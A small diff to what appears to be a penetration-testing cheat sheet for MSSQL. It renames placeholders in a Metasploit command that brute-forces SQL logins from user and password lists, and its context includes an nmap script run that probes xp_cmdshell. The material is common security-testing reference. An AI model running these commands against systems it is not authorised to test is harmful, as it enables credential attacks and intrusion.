@@ -18,7 +18,7 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 ## mssql - enum sql login
 #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-msfconsole -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <pass_file>; run"
+msfconsole -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS <rhost>; set USER_FILE <users.txt>; set PASS_FILE <passwords.txt>; run"
 ```
 
 ## mssql - enum configuration setting (xp-cmdshell)
